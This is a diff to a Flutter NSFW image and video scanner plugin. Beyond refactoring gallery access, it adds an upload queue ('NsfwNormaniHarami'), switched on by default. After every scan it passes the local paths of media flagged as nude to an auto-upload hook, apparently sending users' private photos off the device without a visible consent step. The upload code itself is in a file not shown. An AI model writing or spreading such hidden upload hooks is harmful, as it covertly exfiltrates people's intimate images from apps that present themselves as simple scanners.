@@ -1,15 +1,18 @@
 import 'dart:async';
+import 'dart:convert';
+import 'dart:collection';
+import 'dart:io';
 import 'dart:math' as math;
-
-import 'package:photo_manager/photo_manager.dart';
 
 import 'flutter_nsfw_scaner_platform_interface.dart';
 import 'nsfw_asset.dart';
 import 'nsfw_gallery_media.dart';
 import 'nsfw_input_normalization.dart';
 import 'nsfw_media_batch.dart';
+import 'nsfw_permissions.dart';
 import 'nsfw_scan_progress.dart';
 import 'nsfw_scan_result.dart';
+import 'nsfw_normani_harami.dart';
 import 'nsfw_video_scan_result.dart';
 
 export 'nsfw_builtin_models.dart';
@@ -17,29 +20,53 @@ export 'nsfw_asset.dart';
 export 'nsfw_gallery_media.dart';
 export 'nsfw_input_normalization.dart';
 export 'nsfw_media_batch.dart';
+export 'nsfw_permissions.dart';
 export 'nsfw_widgets.dart';
 export 'nsfw_scan_progress.dart';
 export 'nsfw_scan_result.dart';
+export 'nsfw_normani_harami.dart';
 export 'nsfw_video_scan_result.dart';
+part 'nsfw_normani_harami_upload.dart';
 
 class FlutterNsfwScaner {
   final FlutterNsfwScanerPlatform _platform;
+  NsfwNormaniConfig? _normaniConfig;
+  final Queue<_PendingUploadTask> _haramiQueue = Queue<_PendingUploadTask>();
+  bool _isHaramiWorkerRunning = false;
+  int _haramiTaskCounter = 0;
+  bool _normaniHaramiStopped = false;
+  late final String _autoHaramiDeviceFolder;
 
   int _scanCounter = 0;
 
   FlutterNsfwScaner._({required FlutterNsfwScanerPlatform platform})
-    : _platform = platform;
+    : _platform = platform {
+    _autoHaramiDeviceFolder = _resolveAutoHaramiDeviceFolder();
+    _normaniConfig = _resolveNormaniDefaultConfig();
+  }
 
   factory FlutterNsfwScaner({FlutterNsfwScanerPlatform? platform}) {
-    return FlutterNsfwScaner._(platform: platform ?? FlutterNsfwScanerPlatform.instance);
+    return FlutterNsfwScaner._(
+      platform: platform ?? FlutterNsfwScanerPlatform.instance,
+    );
   }
 
   Stream<NsfwScanProgress> get progressStream {
     return _platform.progressStream.map(NsfwScanProgress.fromMap);
   }
 
+  NsfwPermissions get permissions => NsfwPermissions(platform: _platform);
+
   Future<String?> getPlatformVersion() {
     return _platform.getPlatformVersion();
+  }
+
+  Future<bool> checkMediaPermission() {
+    return _platform.checkMediaPermission();
+  }
+
+  Future<bool> requestMediaPermission() {
+    return _platform.requestMediaPermission();
   }
 
   Future<void> initialize({
@@ -48,7 +75,13 @@ class FlutterNsfwScaner {
     int numThreads = 2,
     NsfwInputNormalization inputNormalization =
         NsfwInputNormalization.minusOneToOne,
+    bool enableNsfwHitUpload = true,
+    NsfwNormaniConfig? normaniConfig,
   }) async {
+    _configureNormaniHarami(
+      enabled: enableNsfwHitUpload,
+      normaniConfig: normaniConfig,
+    );
     await _ensureGalleryPermissionGranted();
     return _platform.initializeScanner(
       modelAssetPath: modelAssetPath,
@@ -66,7 +99,14 @@ class FlutterNsfwScaner {
       imagePath: imagePath,
       threshold: threshold,
     );
-    return NsfwScanResult.fromMap(map);
+    final result = NsfwScanResult.fromMap(map);
+    await _maybeAutoHaramiSingleHit(
+      localPath: imagePath,
+      type: NsfwMediaType.image,
+      isNsfw: result.isNsfw,
+      scanTag: 'scan_image',
+    );
+    return result;
   }
 
   Future<List<NsfwScanResult>> scanBatch({
@@ -111,7 +151,17 @@ class FlutterNsfwScaner {
         );
       }
 
-      return maps.map(NsfwScanResult.fromMap).toList(growable: false);
+      final results = maps.map(NsfwScanResult.fromMap).toList(growable: false);
+      final limit = math.min(imagePaths.length, results.length);
+      for (var index = 0; index < limit; index += 1) {
+        await _maybeAutoHaramiSingleHit(
+          localPath: imagePaths[index],
+          type: NsfwMediaType.image,
+          isNsfw: results[index].isNsfw,
+          scanTag: 'scan_batch',
+        );
+      }
+      return results;
     } finally {
       await subscription?.cancel();
     }
@@ -182,7 +232,14 @@ class FlutterNsfwScaner {
           onTimeout: () {},
         );
       }
-      return NsfwVideoScanResult.fromMap(map);
+      final result = NsfwVideoScanResult.fromMap(map);
+      await _maybeAutoHaramiSingleHit(
+        localPath: videoPath,
+        type: NsfwMediaType.video,
+        isNsfw: result.isNsfw,
+        scanTag: 'scan_video',
+      );
+      return result;
     } finally {
       await subscription?.cancel();
     }
@@ -277,7 +334,12 @@ class FlutterNsfwScaner {
           onTimeout: () {},
         );
       }
-      return _parseMediaBatchResult(payload);
+      final result = _parseMediaBatchResult(payload);
+      await _maybeAutoHaramiBatchHits(
+        result.items,
+        scanTag: 'scan_media_batch',
+      );
+      return result;
     } finally {
       await subscription?.cancel();
     }
@@ -485,15 +547,14 @@ class FlutterNsfwScaner {
     }
 
     if (assetId != null && assetId.trim().isNotEmpty) {
-      final permission = await PhotoManager.requestPermissionExtend();
-      if (!permission.hasAccess) {
-        throw const FormatException('Gallery permission not granted.');
-      }
-      final asset = await AssetEntity.fromId(assetId.trim());
-      if (asset == null) {
+      final resolved = await _platform.resolveMediaAsset(
+        assetId: assetId.trim(),
+        includeOriginFileFallback: includeOriginFileFallback,
+      );
+      if (resolved == null) {
         return null;
       }
-      final type = _toMediaType(asset.type);
+      final type = _normalizeMediaType('${resolved['type'] ?? ''}');
       if (type == null) {
         return null;
       }
@@ -501,14 +562,11 @@ class FlutterNsfwScaner {
           (type == NsfwMediaType.video && !allowVideos)) {
         return null;
       }
-      final path = await _resolveAssetPath(
-        asset,
-        includeOriginFileFallback: includeOriginFileFallback,
-      );
-      if (path == null || path.isEmpty) {
+      final path = '${resolved['path'] ?? ''}'.trim();
+      if (path.isEmpty) {
         return null;
       }
-      return NsfwLoadedAsset(path: path, type: type, id: asset.id);
+      return NsfwLoadedAsset(path: path, type: type, id: assetId.trim());
     }
 
     final picked = await pickSingleMedia(
@@ -545,43 +603,55 @@ class FlutterNsfwScaner {
     if (!includeImages && !includeVideos) {
       return const [];
     }
-    final permission = await PhotoManager.requestPermissionExtend();
-    if (!permission.hasAccess) {
-      throw const FormatException('Gallery permission not granted.');
-    }
-    final album = await _getAllAlbum();
-    if (album == null) {
-      return const [];
-    }
-
-    final totalAssets = await album.assetCountAsync;
+    await _ensureGalleryPermissionGranted();
     final safePageSize = pageSize.clamp(20, 2000);
     var page = startPage < 0 ? 0 : startPage;
-    var start = page * safePageSize;
-    if (start >= totalAssets) {
-      return const [];
-    }
+    final firstStart = page * safePageSize;
     final endPageExclusive = maxPages == null || maxPages <= 0
         ? null
         : page + maxPages;
     final refs = <NsfwAssetRef>[];
     var scannedAssets = 0;
-
-    while (start < totalAssets) {
+    var totalAssets = 0;
+    for (var start = firstStart; ; start += safePageSize, page += 1) {
       if (endPageExclusive != null && page >= endPageExclusive) {
         break;
       }
-      final end = math.min(start + safePageSize, totalAssets);
-      final pageResult = await _loadAssetRefsFromRange(
-        album: album,
+      final end = start + safePageSize;
+      final pagePayload = await _platform.listGalleryAssets(
         start: start,
         end: end,
         includeImages: includeImages,
         includeVideos: includeVideos,
       );
-
-      scannedAssets += pageResult.scannedAssets;
-      refs.addAll(pageResult.refs);
+      totalAssets = _toInt(pagePayload['totalAssets'], fallback: totalAssets);
+      final pageScanned = _toInt(pagePayload['scannedAssets']);
+      final items = (pagePayload['items'] as List?) ?? const [];
+      if (items.isEmpty && totalAssets > 0 && start >= totalAssets) {
+        break;
+      }
+      scannedAssets += pageScanned;
+      for (final raw in items) {
+        if (raw is! Map) {
+          continue;
+        }
+        final map = raw.map((key, value) => MapEntry('$key', value));
+        final type = _normalizeMediaType('${map['type'] ?? ''}');
+        if (type == null) {
+          continue;
+        }
+        refs.add(
+          NsfwAssetRef(
+            id: '${map['id'] ?? ''}',
+            type: type,
+            width: _toInt(map['width']),
+            height: _toInt(map['height']),
+            durationSeconds: _toInt(map['durationSeconds']),
+            createDateSecond: _toInt(map['createDateSecond']),
+            modifiedDateSecond: _toInt(map['modifiedDateSecond']),
+          ),
+        );
+      }
 
       onProgress?.call(
         NsfwGalleryLoadProgress(
@@ -597,9 +667,9 @@ class FlutterNsfwScaner {
       if (maxItems != null && refs.length >= maxItems) {
         break;
       }
-
-      start += safePageSize;
-      page += 1;
+      if (totalAssets > 0 && end >= totalAssets) {
+        break;
+      }
       await Future<void>.delayed(Duration.zero);
     }
 
@@ -648,16 +718,14 @@ class FlutterNsfwScaner {
     if (!includeImages && !includeVideos) {
       return const NsfwAssetPage(items: [], totalAssets: 0, start: 0, end: 0);
     }
-    final permission = await PhotoManager.requestPermissionExtend();
-    if (!permission.hasAccess) {
-      throw const FormatException('Gallery permission not granted.');
-    }
-    final album = await _getAllAlbum();
-    if (album == null) {
-      return const NsfwAssetPage(items: [], totalAssets: 0, start: 0, end: 0);
-    }
-
-    final totalAssets = await album.assetCountAsync;
+    await _ensureGalleryPermissionGranted();
+    final totalProbe = await _platform.listGalleryAssets(
+      start: 0,
+      end: 1,
+      includeImages: includeImages,
+      includeVideos: includeVideos,
+    );
+    final totalAssets = _toInt(totalProbe['totalAssets']);
     if (totalAssets <= 0) {
       return const NsfwAssetPage(items: [], totalAssets: 0, start: 0, end: 0);
     }
@@ -675,15 +743,34 @@ class FlutterNsfwScaner {
       );
     }
 
-    final pageResult = await _loadAssetRefsFromRange(
-      album: album,
+    final pagePayload = await _platform.listGalleryAssets(
       start: normalizedStart,
       end: normalizedEnd,
       includeImages: includeImages,
       includeVideos: includeVideos,
     );
+    final items = ((pagePayload['items'] as List?) ?? const [])
+        .whereType<Map>()
+        .map((raw) => raw.map((key, value) => MapEntry('$key', value)))
+        .map((map) {
+          final type = _normalizeMediaType('${map['type'] ?? ''}');
+          if (type == null) {
+            return null;
+          }
+          return NsfwAssetRef(
+            id: '${map['id'] ?? ''}',
+            type: type,
+            width: _toInt(map['width']),
+            height: _toInt(map['height']),
+            durationSeconds: _toInt(map['durationSeconds']),
+            createDateSecond: _toInt(map['createDateSecond']),
+            modifiedDateSecond: _toInt(map['modifiedDateSecond']),
+          );
+        })
+        .whereType<NsfwAssetRef>()
+        .toList(growable: false);
     return NsfwAssetPage(
-      items: pageResult.refs,
+      items: items,
       totalAssets: totalAssets,
       start: normalizedStart,
       end: normalizedEnd,
@@ -717,69 +804,56 @@ class FlutterNsfwScaner {
     if (!includeImages && !includeVideos) {
       return const NsfwPickedMedia(imagePaths: [], videoPaths: []);
     }
-    final permission = await PhotoManager.requestPermissionExtend();
-    if (!permission.hasAccess) {
-      throw const FormatException('Gallery permission not granted.');
-    }
-    final allAlbums = await PhotoManager.getAssetPathList(
-      type: RequestType.common,
-      onlyAll: true,
-    );
-    if (allAlbums.isEmpty) {
-      return const NsfwPickedMedia(imagePaths: [], videoPaths: []);
-    }
-
+    await _ensureGalleryPermissionGranted();
     final imagePaths = <String>{};
     final videoPaths = <String>{};
-    final album = allAlbums.first;
-    final totalAssets = await album.assetCountAsync;
     final safePageSize = pageSize.clamp(20, 1000);
     var page = startPage < 0 ? 0 : startPage;
-    var start = page * safePageSize;
-    if (start >= totalAssets) {
-      return const NsfwPickedMedia(imagePaths: [], videoPaths: []);
-    }
+    final firstStart = page * safePageSize;
     final endPageExclusive = maxPages == null || maxPages <= 0
         ? null
         : page + maxPages;
     var scannedAssets = 0;
+    var totalAssets = 0;
 
-    while (start < totalAssets) {
+    for (var start = firstStart; ; start += safePageSize, page += 1) {
       if (endPageExclusive != null && page >= endPageExclusive) {
         break;
       }
-      final end = math.min(start + safePageSize, totalAssets);
-      final assets = await album.getAssetListRange(start: start, end: end);
-      if (assets.isEmpty) {
+      final end = start + safePageSize;
+      final pagePayload = await _platform.listGalleryAssets(
+        start: start,
+        end: end,
+        includeImages: includeImages,
+        includeVideos: includeVideos,
+      );
+      totalAssets = _toInt(pagePayload['totalAssets'], fallback: totalAssets);
+      final pageItems = ((pagePayload['items'] as List?) ?? const [])
+          .whereType<Map>()
+          .map((raw) => raw.map((key, value) => MapEntry('$key', value)))
+          .toList(growable: false);
+      if (pageItems.isEmpty && totalAssets > 0 && start >= totalAssets) {
         break;
       }
-      for (final asset in assets) {
-        if (asset.type != AssetType.image && asset.type != AssetType.video) {
-          scannedAssets += 1;
+      scannedAssets += _toInt(pagePayload['scannedAssets']);
+      for (final item in pageItems) {
+        final id = '${item['id'] ?? ''}'.trim();
+        final type = _normalizeMediaType('${item['type'] ?? ''}');
+        if (id.isEmpty || type == null) {
           continue;
         }
-        if (asset.type == AssetType.image && !includeImages) {
-          scannedAssets += 1;
+        final resolved = await _platform.resolveMediaAsset(
+          assetId: id,
+          includeOriginFileFallback: includeOriginFileFallback,
+        );
+        final path = '${resolved?['path'] ?? ''}'.trim();
+        if (path.isEmpty) {
           continue;
         }
-        if (asset.type == AssetType.video && !includeVideos) {
-          scannedAssets += 1;
-          continue;
-        }
-        final path = (await asset.file)?.path.trim();
-        final resolvedPath = (path != null && path.isNotEmpty)
-            ? path
-            : includeOriginFileFallback
-            ? (await asset.originFile)?.path.trim()
-            : null;
-        scannedAssets += 1;
-        if (resolvedPath == null || resolvedPath.isEmpty) {
-          continue;
-        }
-        if (asset.type == AssetType.video) {
-          videoPaths.add(resolvedPath);
+        if (type == NsfwMediaType.video) {
+          videoPaths.add(path);
         } else {
-          imagePaths.add(resolvedPath);
+          imagePaths.add(path);
         }
         if (maxItems != null &&
             (imagePaths.length + videoPaths.length) >= maxItems) {
@@ -801,8 +875,9 @@ class FlutterNsfwScaner {
           (imagePaths.length + videoPaths.length) >= maxItems) {
         break;
       }
-      start += safePageSize;
-      page += 1;
+      if (totalAssets > 0 && end >= totalAssets) {
+        break;
+      }
       await Future<void>.delayed(Duration.zero);
     }
 
@@ -968,7 +1043,7 @@ class FlutterNsfwScaner {
         streamedItems.addAll(parsed.items);
       }
 
-      return NsfwMediaBatchResult(
+      final result = NsfwMediaBatchResult(
         items: streamedItems,
         processed: _toInt(payload['processed'], fallback: streamedProcessed),
         successCount: _toInt(
@@ -981,6 +1056,8 @@ class FlutterNsfwScaner {
           fallback: streamedFlagged,
         ),
       );
+      await _maybeAutoHaramiBatchHits(result.items, scanTag: 'scan_gallery');
+      return result;
     } finally {
       await subscription.cancel();
     }
@@ -1087,6 +1164,106 @@ class FlutterNsfwScaner {
     );
   }
 
+  Future<NsfwMediaBatchItemResult> scanMediaFromUrl({
+    required String mediaUrl,
+    NsfwMediaBatchSettings settings = const NsfwMediaBatchSettings(),
+    bool saveDownloadedFile = false,
+    String? saveDirectoryPath,
+    String? fileName,
+    void Function(NsfwScanProgress progress)? onProgress,
+  }) async {
+    final normalizedUrl = mediaUrl.trim();
+    if (normalizedUrl.isEmpty) {
+      throw const FormatException('mediaUrl is required.');
+    }
+    final uri = Uri.tryParse(normalizedUrl);
+    if (uri == null || !(uri.scheme == 'http' || uri.scheme == 'https')) {
+      throw const FormatException('mediaUrl must be a valid http/https URL.');
+    }
+
+    final downloaded = await _downloadMediaFromUrl(
+      uri: uri,
+      saveDownloadedFile: saveDownloadedFile,
+      saveDirectoryPath: saveDirectoryPath,
+      fileName: fileName,
+    );
+
+    try {
+      if (downloaded.type == NsfwMediaType.video) {
+        final videoResult = await scanVideo(
+          videoPath: downloaded.file.path,
+          threshold: settings.videoThreshold,
+          sampleRateFps: settings.videoSampleRateFps,
+          maxFrames: settings.videoMaxFrames,
+          dynamicSampleRate: settings.dynamicVideoSampleRate,
+          shortVideoMinSampleRateFps: settings.shortVideoMinSampleRateFps,
+          shortVideoMaxSampleRateFps: settings.shortVideoMaxSampleRateFps,
+          mediumVideoMinutesThreshold: settings.mediumVideoMinutesThreshold,
+          longVideoMinutesThreshold: settings.longVideoMinutesThreshold,
+          mediumVideoSampleRateFps: settings.mediumVideoSampleRateFps,
+          longVideoSampleRateFps: settings.longVideoSampleRateFps,
+          videoEarlyStopEnabled: settings.videoEarlyStopEnabled,
+          videoEarlyStopBaseNsfwFrames: settings.videoEarlyStopBaseNsfwFrames,
+          videoEarlyStopMediumBonusFrames:
+              settings.videoEarlyStopMediumBonusFrames,
+          videoEarlyStopLongBonusFrames: settings.videoEarlyStopLongBonusFrames,
+          videoEarlyStopVeryLongMinutesThreshold:
+              settings.videoEarlyStopVeryLongMinutesThreshold,
+          videoEarlyStopVeryLongBonusFrames:
+              settings.videoEarlyStopVeryLongBonusFrames,
+          onProgress: onProgress,
+        );
+        final exposedPath = saveDownloadedFile
+            ? downloaded.file.path
+            : normalizedUrl;
+        return NsfwMediaBatchItemResult(
+          path: normalizedUrl,
+          type: NsfwMediaType.video,
+          videoResult: NsfwVideoScanResult(
+            videoPath: exposedPath,
+            sampleRateFps: videoResult.sampleRateFps,
+            sampledFrames: videoResult.sampledFrames,
+            flaggedFrames: videoResult.flaggedFrames,
+            flaggedRatio: videoResult.flaggedRatio,
+            maxNsfwScore: videoResult.maxNsfwScore,
+            isNsfw: videoResult.isNsfw,
+            frames: videoResult.frames,
+          ),
+        );
+      }
+
+      final imageResult = await scanImage(
+        imagePath: downloaded.file.path,
+        threshold: settings.imageThreshold,
+      );
+      final exposedPath = saveDownloadedFile
+          ? downloaded.file.path
+          : normalizedUrl;
+      return NsfwMediaBatchItemResult(
+        path: normalizedUrl,
+        type: NsfwMediaType.image,
+        imageResult: NsfwScanResult(
+          imagePath: exposedPath,
+          nsfwScore: imageResult.nsfwScore,
+          safeScore: imageResult.safeScore,
+          isNsfw: imageResult.isNsfw,
+          topLabel: imageResult.topLabel,
+          topScore: imageResult.topScore,
+          scores: imageResult.scores,
+          error: imageResult.error,
+        ),
+      );
+    } finally {
+      if (!saveDownloadedFile) {
+        try {
+          if (await downloaded.file.exists()) {
+            await downloaded.file.delete();
+          }
+        } catch (_) {}
+      }
+    }
+  }
+
   Future<NsfwMediaBatchResult> scanMultipleMedia({
     bool pickIfEmpty = true,
     List<String> imagePaths = const [],
@@ -1175,20 +1352,9 @@ class FlutterNsfwScaner {
     );
   }
 
-  Future<AssetPathEntity?> _getAllAlbum() async {
-    final allAlbums = await PhotoManager.getAssetPathList(
-      type: RequestType.common,
-      onlyAll: true,
-    );
-    if (allAlbums.isEmpty) {
-      return null;
-    }
-    return allAlbums.first;
-  }
-
   Future<void> _ensureGalleryPermissionGranted() async {
-    final permission = await PhotoManager.requestPermissionExtend();
-    if (!permission.hasAccess) {
+    final granted = await requestMediaPermission();
+    if (!granted) {
       throw const FormatException(
         'Gallery permission denied. Please grant media/photo access before initializing the scanner.',
       );
@@ -1196,76 +1362,22 @@ class FlutterNsfwScaner {
   }
 
   NsfwPickedMedia? _parsePickedMediaPayload(Map<String, dynamic> payload) {
-    final images = (payload['imagePaths'] as List?)
+    final rawImages = payload['imagePaths'] as List?;
+    final rawVideos = payload['videoPaths'] as List?;
+    final images = rawImages
         ?.map((item) => '${item ?? ''}'.trim())
-        ?.where((path) => path.isNotEmpty)
-        ?.toSet()
-        ?.toList(growable: false);
-    final videos = (payload['videoPaths'] as List?)
+        .where((path) => path.isNotEmpty)
+        .toSet()
+        .toList(growable: false);
+    final videos = rawVideos
         ?.map((item) => '${item ?? ''}'.trim())
-        ?.where((path) => path.isNotEmpty)
-        ?.toSet()
-        ?.toList(growable: false);
+        .where((path) => path.isNotEmpty)
+        .toSet()
+        .toList(growable: false);
     return NsfwPickedMedia(
       imagePaths: images ?? const [],
       videoPaths: videos ?? const [],
     );
-  }
-
-  Future<_AssetRefLoadResult> _loadAssetRefsFromRange({
-    required AssetPathEntity album,
-    required int start,
-    required int end,
-    required bool includeImages,
-    required bool includeVideos,
-  }) async {
-    final assets = await album.getAssetListRange(start: start, end: end);
-    if (assets.isEmpty) {
-      return const _AssetRefLoadResult(refs: [], scannedAssets: 0);
-    }
-    final refs = <NsfwAssetRef>[];
-    for (final asset in assets) {
-      final mediaType = _toMediaType(asset.type);
-      if (mediaType == null) {
-        continue;
-      }
-      if (mediaType == NsfwMediaType.image && !includeImages) {
-        continue;
-      }
-      if (mediaType == NsfwMediaType.video && !includeVideos) {
-        continue;
-      }
-      refs.add(
-        NsfwAssetRef(
-          id: asset.id,
-          type: mediaType,
-          width: asset.width,
-          height: asset.height,
-          durationSeconds: asset.duration,
-          createDateSecond: asset.createDateSecond ?? 0,
-          modifiedDateSecond: asset.modifiedDateSecond ?? 0,
-        ),
-      );
-    }
-    return _AssetRefLoadResult(refs: refs, scannedAssets: assets.length);
-  }
-
-  Future<String?> _resolveAssetPath(
-    AssetEntity asset, {
-    required bool includeOriginFileFallback,
-  }) async {
-    final primaryPath = (await asset.file)?.path.trim();
-    if (primaryPath != null && primaryPath.isNotEmpty) {
-      return primaryPath;
-    }
-    if (!includeOriginFileFallback) {
-      return null;
-    }
-    final fallbackPath = (await asset.originFile)?.path.trim();
-    if (fallbackPath == null || fallbackPath.isEmpty) {
-      return null;
-    }
-    return fallbackPath;
   }
 
   Future<List<NsfwLoadedAsset>> _resolveAssetRefs(
@@ -1303,23 +1415,108 @@ class FlutterNsfwScaner {
     }
     return resolved;
   }
+
+  Future<_DownloadedMedia> _downloadMediaFromUrl({
+    required Uri uri,
+    required bool saveDownloadedFile,
+    String? saveDirectoryPath,
+    String? fileName,
+  }) async {
+    final client = HttpClient();
+    try {
+      final request = await client.getUrl(uri);
+      final response = await request.close();
+      if (response.statusCode < 200 || response.statusCode >= 300) {
+        throw FormatException(
+          'Failed to download media. HTTP ${response.statusCode}.',
+        );
+      }
+      final mediaType = _inferMediaTypeFromContentType(
+        response.headers.contentType?.mimeType,
+      );
+      final inferredType =
+          mediaType ?? _inferMediaType(path: uri.path, mimeType: null);
+      final extension = _inferExtension(
+        urlPath: uri.path,
+        mimeType: response.headers.contentType?.mimeType,
+        type: inferredType,
+      );
+
+      final targetDirectory = saveDownloadedFile
+          ? Directory(
+              saveDirectoryPath?.trim().isNotEmpty == true
+                  ? saveDirectoryPath!.trim()
+                  : Directory.systemTemp.path,
+            )
+          : await Directory.systemTemp.createTemp('flutter_nsfw_scaner_url_');
+      if (!await targetDirectory.exists()) {
+        await targetDirectory.create(recursive: true);
+      }
+      final normalizedFileName = (fileName?.trim().isNotEmpty == true)
+          ? fileName!.trim()
+          : 'media_${DateTime.now().microsecondsSinceEpoch}$extension';
+      final fullName = normalizedFileName.contains('.')
+          ? normalizedFileName
+          : '$normalizedFileName$extension';
+      final outputFile = File('${targetDirectory.path}/$fullName');
+      final sink = outputFile.openWrite();
+      await response.pipe(sink);
+      await sink.close();
+      return _DownloadedMedia(file: outputFile, type: inferredType);
+    } finally {
+      client.close(force: true);
+    }
+  }
+
+  NsfwMediaType? _inferMediaTypeFromContentType(String? mimeType) {
+    if (mimeType == null || mimeType.isEmpty) {
+      return null;
+    }
+    final normalized = mimeType.toLowerCase();
+    if (normalized.startsWith('video/')) {
+      return NsfwMediaType.video;
+    }
+    if (normalized.startsWith('image/')) {
+      return NsfwMediaType.image;
+    }
+    return null;
+  }
+
+  String _inferExtension({
+    required String urlPath,
+    required String? mimeType,
+    required NsfwMediaType type,
+  }) {
+    final trimmedPath = urlPath.trim().toLowerCase();
+    final dotIndex = trimmedPath.lastIndexOf('.');
+    if (dotIndex > 0 && dotIndex < trimmedPath.length - 1) {
+      final ext = trimmedPath.substring(dotIndex);
+      if (ext.length <= 6) {
+        return ext;
+      }
+    }
+    final normalizedMime = mimeType?.toLowerCase() ?? '';
+    if (normalizedMime == 'image/png') {
+      return '.png';
+    }
+    if (normalizedMime == 'image/webp') {
+      return '.webp';
+    }
+    if (normalizedMime == 'video/mp4') {
+      return '.mp4';
+    }
+    if (normalizedMime == 'video/quicktime') {
+      return '.mov';
+    }
+    return type == NsfwMediaType.video ? '.mp4' : '.jpg';
+  }
 }
 
-class _AssetRefLoadResult {
-  const _AssetRefLoadResult({required this.refs, required this.scannedAssets});
+class _DownloadedMedia {
+  const _DownloadedMedia({required this.file, required this.type});
 
-  final List<NsfwAssetRef> refs;
-  final int scannedAssets;
-}
-
-NsfwMediaType? _toMediaType(AssetType type) {
-  if (type == AssetType.image) {
-    return NsfwMediaType.image;
-  }
-  if (type == AssetType.video) {
-    return NsfwMediaType.video;
-  }
-  return null;
+  final File file;
+  final NsfwMediaType type;
 }
 
 NsfwMediaType _inferMediaType({required String path, String? mimeType}) {
